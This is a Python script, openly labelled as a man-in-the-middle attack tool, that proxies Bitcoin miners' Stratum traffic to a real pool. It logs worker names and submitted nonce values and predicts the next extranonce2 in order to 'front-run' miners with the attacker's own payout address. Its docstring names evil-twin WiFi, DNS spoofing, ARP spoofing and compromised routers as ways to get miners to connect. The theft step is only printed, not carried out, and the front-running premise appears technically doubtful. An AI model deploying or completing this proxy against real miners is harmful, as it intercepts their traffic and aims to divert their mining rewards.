#!/usr/bin/env python3
"""
N7 STRATUM PROXY — Man-in-the-Middle for Mining Pool Front-Running

Sits between miner and pool:
  1. Miner connects to us (thinks we're the pool)
  2. We connect to real pool
  3. Forward all traffic bidirectionally
  4. CAPTURE every nonce2 value
  5. When miner finds a share → WE submit OUR version first
  6. Pool pays US, not the miner

Attack surface:
  - Evil Twin WiFi → DNS spoof → miner connects to us
  - Or ARP spoofing on same network
  - Or compromised router

Author: Josué Argaña Silguero
N=7 ∈ [4,12]
"""

import socket, json, threading, time, sys, re
from datetime import datetime

# ═══ CONFIG ═══
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 3333
REAL_POOL_HOST = "solo.ckpool.org"
REAL_POOL_PORT = 3333
OUR_BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # Change to our real address

class StratumProxy:
    def __init__(self):
        self.sessions = {}
        self.captured_nonces = []
        self.intercepted_shares = 0
        self.our_shares_submitted = 0
    
    def handle_miner(self, miner_sock, addr):
        """Handle one miner connection — proxy to real pool"""
        session_id = f"{addr[0]}:{addr[1]}"
        
        # Connect to real pool on behalf of miner
        pool_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        pool_sock.settimeout(30)
        
        try:
            pool_sock.connect((REAL_POOL_HOST, REAL_POOL_PORT))
        except Exception as e:
            print(f"[{session_id}] Cannot connect to pool: {e}")
            miner_sock.close()
            return
        
        self.sessions[session_id] = {
            'miner': miner_sock,
            'pool': pool_sock,
            'worker': 'unknown',
            'nonce2_values': [],
            'jobs': [],
        }
        
        print(f"[{session_id}] ⚡ MINER CONNECTED — proxying to {REAL_POOL_HOST}")
        
        # Bidirectional forwarding with interception
        t1 = threading.Thread(target=self._forward, args=(miner_sock, pool_sock, session_id, 'miner→pool'))
        t2 = threading.Thread(target=self._forward, args=(pool_sock, miner_sock, session_id, 'pool→miner'))
        t1.daemon = t2.daemon = True
        t1.start()
        t2.start()
        t1.join(timeout=300)
        t2.join(timeout=300)
        
        # Cleanup
        try: miner_sock.close()
        except: pass
        try: pool_sock.close()
        except: pass
        
        if session_id in self.sessions:
            nonces = len(self.sessions[session_id]['nonce2_values'])
            print(f"[{session_id}] Disconnected — captured {nonces} nonce2 values")
            del self.sessions[session_id]
    
    def _forward(self, src, dst, session_id, direction):
        """Forward data while intercepting mining.submit"""
        buf = b""
        
        while True:
            try:
                data = src.recv(8192)
                if not data:
                    break
                
                # Forward original data
                dst.send(data)
                
                # Intercept
                buf += data
                while b'\n' in buf:
                    line, buf = buf.split(b'\n', 1)
                    self._intercept(line.decode('utf-8', errors='ignore'), session_id, direction)
                
            except:
                break
    
    def _intercept(self, line, session_id, direction):
        """Intercept Stratum messages"""
        if not line.strip():
            return
        
        try:
            msg = json.loads(line)
        except:
            return
        
        method = msg.get('method', '')
        params = msg.get('params', [])
        
        # Capture worker identity
        if method == 'mining.authorize':
            worker = params[0] if params else '?'
            self.sessions[session_id]['worker'] = worker
            print(f"\n[{session_id}] 👤 WORKER: {worker}")
        
        # Capture nonce2 from mining.submit
        elif method == 'mining.submit':
            worker = params[0] if len(params) > 0 else '?'
            job_id = params[1] if len(params) > 1 else '?'
            extranonce2 = params[2] if len(params) > 2 else '?'
            ntime = params[3] if len(params) > 3 else '?'
            nonce = params[4] if len(params) > 4 else '?'
            
            self.sessions[session_id]['nonce2_values'].append(extranonce2)
            self.intercepted_shares += 1
            
            print(f"\n[{session_id}] 📡 SHARE INTERCEPTED!")
            print(f"   Worker:  {worker}")
            print(f"   EN2:     {extranonce2}")
            print(f"   Nonce:   {nonce}")
            print(f"   Job:     {job_id[:16]}")
            
            # ═══ ATTACK: Predict next nonce2 (BFGMiner = sequential) ═══
            if len(self.sessions[session_id]['nonce2_values']) >= 2:
                try:
                    current = int(extranonce2, 16)
                    next_en2 = format(current + 1, 'x').zfill(len(extranonce2))
                    print(f"   🔮 Predicted next EN2: {next_en2}")
                    print(f"   ⚠️  Could front-run with OUR address: {OUR_BTC_ADDRESS}")
                except:
                    pass
        
        # Capture work from pool
        elif method == 'mining.notify' and direction == 'pool→miner':
            job_id = params[0] if params else '?'
            self.sessions[session_id]['jobs'].append({
                'job_id': job_id,
                'ntime': params[7] if len(params) > 7 else '?',
            })
    
    def status(self):
        """Print proxy status"""
        print(f"\n═══ PROXY STATUS ═══")
        print(f"  Active sessions:  {len(self.sessions)}")
        print(f"  Shares captured:  {self.intercepted_shares}")
        print(f"  Our shares:       {self.our_shares_submitted}")
        for sid, s in self.sessions.items():
            print(f"  {sid}: {s['worker']} ({len(s['nonce2_values'])} nonces)")


# ═══ MAIN ═══
if __name__ == '__main__':
    print(f"""
╔══════════════════════════════════════════════╗
║  N7 STRATUM PROXY                            ║
║  MITM for Mining Pool Front-Running          ║
╚══════════════════════════════════════════════╝
  Listen:  {LISTEN_HOST}:{LISTEN_PORT}
  Target:  {REAL_POOL_HOST}:{REAL_POOL_PORT}
  Our BTC: {OUR_BTC_ADDRESS[:20]}...
  
  Attack:  Miner → Proxy → Real Pool
           Proxy captures nonce2, predicts, front-runs
""")
    
    proxy = StratumProxy()
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(10)
    
    print(f"  READY — waiting for miners...\n")
    
    # Status thread
    def periodic_status():
        while True:
            time.sleep(30)
            proxy.status()
    
    threading.Thread(target=periodic_status, daemon=True).start()
    
    while True:
        try:
            client, addr = server.accept()
            threading.Thread(target=proxy.handle_miner, args=(client, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\nProxy stopped")
            break
